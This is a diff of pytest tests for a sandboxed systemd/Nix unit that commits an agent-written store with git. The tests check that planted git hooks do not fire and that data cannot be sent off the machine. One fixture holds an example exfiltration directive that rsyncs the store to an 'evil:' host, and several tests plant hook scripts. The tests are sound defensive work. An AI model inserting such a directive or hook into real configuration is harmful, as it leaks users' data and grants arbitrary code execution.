+    p = _run(store, HOME=str(home), GIT_CONFIG_GLOBAL=str(gitconfig))
+    assert p.returncode == 0, p.stderr
+    who = _git(store / "some-scope", "log", "-1", "--format=%an <%ae>").stdout
+    assert "ambient@example.com" not in who, (
+        "ambient GLOBAL git config reached git — the neutralisation is gone, so "
+        f"every other ambient key (fsmonitor, filter.*.clean, …) is live too: {who!r}")
+    assert "analyze-service-index@localhost" in who, who
+
+
+def test_a_hook_planted_inside_the_scope_does_not_fire(tmp_path):
+    """🔴 PINS THE `core.hooksPath` ENV PIN SPECIFICALLY.
+
+    Also found by the sweep: setting GIT_CONFIG_COUNT=0 killed nothing, because
+    the ambient-hook test's payload was ALSO blocked by GIT_CONFIG_GLOBAL.
+    A repo-LOCAL hook separates them — neutralising ambient config does nothing
+    about `.git/hooks/post-commit`, and only the env pin (MEASURED to override
+    even a repo-local `core.hooksPath`) stops it.
+
+    This is squarely in the threat model, not a hypothetical: the premise of the
+    whole unit is that an agent's Write tool touches this store, and an agent
+    that can write `<scope>/foo.md` can write `<scope>/.git/hooks/post-commit`.
+    """
+    store = _seed(tmp_path)
+    assert _run(store).returncode == 0
+    scope = store / "some-scope"
+    fired = tmp_path / "FIRED"
+    hooks = scope / ".git" / "hooks"
+    # 🔴 `exist_ok`/`parents` is load-bearing, not defensive: because
+    # init.templateDir is pinned at an EMPTY directory, `git init` copies no
+    # template content and the repo has no .git/hooks directory at all. An
+    # attacker planting a hook would create it, so the fixture must too.
+    hooks.mkdir(parents=True, exist_ok=True)
+    write_exec(hooks / "post-commit", f'echo local >> "{fired}"\n')
+    (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
+
+    p = _run(store)
+    assert p.returncode == 0, p.stderr
+    assert _commits(scope) == 2, "the run did not actually commit"
+    assert not fired.exists(), (
+        "a hook planted INSIDE the scope fired — an errant agent Write now has "
+        "arbitrary code execution every time the timer runs")
+
+
+def test_a_bootstrapped_scope_receives_no_template_content(tmp_path):
+    """🔴 PINS THE `init.templateDir` ENV PIN SPECIFICALLY.
+
+    The sweep found this control unobservable: replacing it killed no test,
+    because `GIT_CONFIG_GLOBAL=/dev/null` independently blocks the only ambient
+    source of `init.templateDir`, so the hook-based fixtures could not tell the
+    two apart. That is redundancy, which is fine — but an unpinned control is
+    one refactor from vanishing unnoticed.
+
+    It IS observable, just not through a hook firing: pinning templateDir at an
+    empty directory means `git init` copies NOTHING into the repository this
+    script creates. Without the pin, git falls back to its built-in template and
+    populates `.git/hooks` with `*.sample` files. Asserting the absence of ALL
+    template content states the guarantee at its real width — "this script's
+    repositories start empty" — rather than naming one file.
+    """
+    store = _seed(tmp_path)
+    assert _run(store).returncode == 0
+    hooks = store / "some-scope" / ".git" / "hooks"
+    contents = sorted(p.name for p in hooks.iterdir()) if hooks.is_dir() else []
+    assert contents == [], (
+        "the bootstrapped scope received template content from git's default "
+        f"template dir: {contents}. init.templateDir is no longer pinned, so a "
+        "global init.templateDir could bake a hook into every new scope.")
+
+
+def test_the_local_hook_fixture_would_actually_fire(tmp_path):
+    """🔴 POSITIVE CONTROL for the test above — another zero-assertion."""
+    scope = tmp_path / "plain-repo"
+    scope.mkdir()
+    fired = tmp_path / "FIRED"
+    subprocess.run(["git", "init", "-q", "-b", "trunk", str(scope)], check=True)
+    _git(scope, "config", "user.name", "T")
+    _git(scope, "config", "user.email", "t@example.com")
+    write_exec(scope / ".git" / "hooks" / "post-commit",
+               f'echo local >> "{fired}"\n')
+    (scope / "a.md").write_text("x\n", encoding="utf-8")
+    _git(scope, "add", "--", "a.md")
+    _git(scope, "commit", "-q", "-m", "m")
+    assert fired.exists(), (
+        "the local-hook fixture does not fire even without commit.sh — "
+        "test_a_hook_planted_inside_the_scope_does_not_fire is vacuous")
+
+
+def test_the_ambient_hook_fixture_would_actually_fire(tmp_path):
+    """🔴 POSITIVE CONTROL for the test above. `not fired.exists()` is a ZERO,
+    and a zero is indistinguishable from a hook fixture that never worked
+    (RULES.md). Drive the same fixture with a plain `git commit` — no commit.sh,
+    so none of its neutralisation applies — and watch the hook fire."""
+    scope = tmp_path / "plain-repo"
+    scope.mkdir()
+    hooks = tmp_path / "evilhooks"
+    fired = tmp_path / "FIRED"
+    hooks.mkdir()
+    write_exec(hooks / "post-commit", f'echo hooksPath >> "{fired}"\n')
+    home = tmp_path / "home"
+    home.mkdir()
+    gitconfig = home / "gitconfig"
+    gitconfig.write_text(
+        "[user]\n\tname = T\n\temail = t@example.com\n"
+        f"[core]\n\thooksPath = {hooks}\n", encoding="utf-8")
+
+    env = dict(os.environ)
+    env.update({"HOME": str(home), "GIT_CONFIG_GLOBAL": str(gitconfig)})
+    for args in (["init", "-q", "-b", "trunk", "."],
+                 ["add", "--", "a.md"],
+                 ["commit", "-q", "-m", "m"]):
+        if args[0] == "add":
+            (scope / "a.md").write_text("x\n", encoding="utf-8")
+        subprocess.run(["git", "-C", str(scope), *args], env=env,
+                       capture_output=True, text=True)
+
+    assert fired.exists(), (
+        "the ambient-hook fixture does not fire even WITHOUT commit.sh — "
+        "test_an_ambient_git_hook_does_not_fire is therefore vacuous")
+
+
+def test_the_units_path_provides_every_binary_the_script_uses():
+    """A user unit does not inherit the login PATH. Without a binary on it the
+    script fails by design — but every day, forever.
+
+    gnugrep and gnused were missing from this list while the script used BOTH
+    (`grep -c .` for the change count, `sed 's/^/    /'` for message indent), so
+    the pin did not cover what it claimed to.
+    """
     src = _home_nix()
     i = src.index("systemd.user.services.analyze-service-index-commit")
-    block = src[i:i + 1200]
+    block = src[i:i + 3000]
     m = re.search(r"PATH=\$\{lib\.makeBinPath \[([^\]]*)\]\}", block)
     assert m, "no explicit PATH on the unit"
-    for pkg in ("pkgs.git", "pkgs.findutils", "pkgs.coreutils", "pkgs.bash"):
+    for pkg in ("pkgs.git", "pkgs.findutils", "pkgs.coreutils", "pkgs.bash",
+                "pkgs.gnugrep", "pkgs.gnused"):
         assert pkg in m.group(1), f"{pkg} missing from the unit PATH"
+
+
+def _service_block() -> str:
+    """The `Service = { … };` body of the unit, brace-matched.
+
+    Fixed-width `src[i:i+N]` slicing (used by the older seam tests) silently
+    stops asserting as soon as the block grows past N — a directive added at the
+    bottom falls outside the window and no test moves. This reads the real
+    extent.
+    """
+    src = _home_nix()
+    i = src.index("systemd.user.services.analyze-service-index-commit")
+    j = src.index("Service = {", i) + len("Service = {")
+    depth, k = 1, j
+    while depth:
+        if src[k] == "{":
+            depth += 1
+        elif src[k] == "}":
+            depth -= 1
+        k += 1
+    return src[j:k - 1]
+
+
+def _service_directives() -> set:
+    """Top-level directive keys inside the Service block."""
+    keys, depth = set(), 0
+    for line in _service_block().splitlines():
+        s = line.strip()
+        if depth == 0:
+            m = re.match(r'"?([A-Za-z][A-Za-z0-9-]*)"?\s*=', s)
+            if m:
+                keys.add(m.group(1))
+        depth += s.count("[") + s.count("{") - s.count("]") - s.count("}")
+    return keys
+
+
+# 🔴 The EXACT set of Service directives. Asserted, not sampled.
+SERVICE_DIRECTIVE_LEDGER = {
+    "Type", "TimeoutStartSec", "Environment",
+    "ProtectSystem", "ProtectHome", "BindReadOnlyPaths", "BindPaths",
+    "PrivateTmp", "PrivateNetwork", "NoNewPrivileges",
+    "ExecStart", "X-Restart-Triggers",
+}
+
+
+def test_execstart_is_the_only_exec_directive():
+    """🔴 NOTHING ASSERTED THIS, AND IT IS A ONE-LINE EXFILTRATION.
+
+    `ExecStartPost = "rsync -a %h/.claude/analyze-service-index/ …"` ships the
+    entire store off-box every day. systemd runs it as part of the same unit, so
+    commit.sh is untouched, the static ledger reads clean, the behavioural
+    "writes nothing outside the store" test never executes it, and the unit
+    still reports success. Every test in this file stayed green.
+
+    So: the Service block's directive key set is pinned EXACTLY, failing when it
+    grows *or* shrinks. Growing catches the injected Exec*; shrinking catches a
+    sandbox directive being quietly dropped.
+    """
+    keys = _service_directives()
+    execs = sorted(k for k in keys if k.startswith("Exec"))
+    assert execs == ["ExecStart"], (
+        f"the unit declares Exec* directive(s) other than ExecStart: {execs}. "
+        "ExecStartPre/ExecStartPost/ExecStopPost all run with the store "
+        "readable and are not covered by any behavioural test here.")
+
+    added = sorted(keys - SERVICE_DIRECTIVE_LEDGER)
+    removed = sorted(SERVICE_DIRECTIVE_LEDGER - keys)
+    assert not added, (
+        f"the unit gained Service directive(s): {added}. Add them to "
+        "SERVICE_DIRECTIVE_LEDGER deliberately, in the same commit, having "
+        "thought about what they let the unit reach.")
+    assert not removed, (
+        f"the unit LOST Service directive(s): {removed}. If a containment "
+        "directive was dropped, the no-exfiltration guarantee went with it.")
+
+
+def test_the_directive_extractor_sees_an_injected_exec():
+    """🔴 POSITIVE CONTROL. `execs == ["ExecStart"]` is a near-zero; prove the
+    parser can actually see the thing it is asserting the absence of."""
+    import types
+    fake = types.SimpleNamespace()
+    fake.text = (
+        "systemd.user.services.analyze-service-index-commit = {\n"
+        "    Service = {\n"
+        '      Type = "oneshot";\n'
+        '      ExecStart = "x";\n'
+        '      ExecStartPost = "rsync -a %h/.claude/analyze-service-index/ evil:";\n'
+        "      Environment = [\n"
+        '        "PATH=/nope"\n'
+        "      ];\n"
+        "    };\n"
+        "  };\n")
+    global _home_nix
+    original = _home_nix
+    try:
+        _home_nix = lambda: fake.text  # noqa: E731
+        keys = _service_directives()
+    finally:
+        _home_nix = original
+    assert "ExecStartPost" in keys, (
+        "the directive extractor cannot see an injected ExecStartPost — "
+        "test_execstart_is_the_only_exec_directive is vacuous")
+    assert "Environment" in keys, "the extractor missed a list-valued directive"
+    assert "PATH" not in keys, "the extractor read a list ELEMENT as a directive"
+
+
+def test_the_unit_is_contained_so_exfiltration_has_nowhere_to_go():
+    """🔴 THE PRIMARY NO-EXFILTRATION CONTROL — the static ledger is secondary.
+
+    Three fix rounds tried to make exfiltration DETECTABLE by reading commit.sh
+    and each was evaded a new way (`cp -r`, eight wrapper prefixes, `{`/`\\`).
+    These directives make it not land instead.
+
+    VERIFIED LIVE 2026-08-06 on the workbench AND the laptop, with
+    `systemd-run --user` carrying exactly these properties and the results read
+    from the journal (the nix build sandbox has no systemd, so this test can
+    only pin the directives — it cannot execute them):
+      * the committer runs normally and its commits persist in the real store;
+      * `cp -r <scope> <dir>` → "Read-only file system", rc=1, nothing lands,
+        against an uncontained positive control of rc=0 and 27 files copied;
+      * bash's BUILTIN `/dev/tcp` egress → rc=1, against rc=0 uncontained. No
+        PATH restriction can close that one: it needs no binary at all.
+
+    ⚠ Note what is deliberately NOT claimed: the unit PATH is not a containment
+    control. `cp` and `tee` live in pkgs.coreutils, which the script genuinely
+    needs, so no honest PATH here removes them.
+    """
+    block = _service_block()
+    for directive, value in (
+            ("ProtectSystem", '"strict"'),
+            ("ProtectHome", '"tmpfs"'),
+            ("PrivateTmp", "true"),
+            ("PrivateNetwork", "true"),
+            ("NoNewPrivileges", "true")):
+        assert re.search(rf"\b{directive}\s*=\s*{re.escape(value)}\s*;", block), (
+            f"{directive} = {value} is missing from the unit. Without it the "
+            "no-exfiltration guarantee rests entirely on a static check that "
+            "has already been evaded three times.")
+
+    assert re.search(r'BindPaths\s*=\s*\[\s*"-%h/\.claude/analyze-service-index"',
+                     block), (
+        "the store is not bind-mounted back in as the ONE writable path (or the "
+        "leading `-` is missing, which makes a host that has never run "
+        "/analyze-service fail to start instead of no-opping cleanly)")
+    assert re.search(
+        r'BindReadOnlyPaths\s*=\s*\[\s*"-%h/workspace/devrc/scripts/analyze-service-index"',
+        block), (
+        "the script directory is not bound in read-only — with ProtectHome="
+        "tmpfs the ExecStart path would not exist inside the namespace")
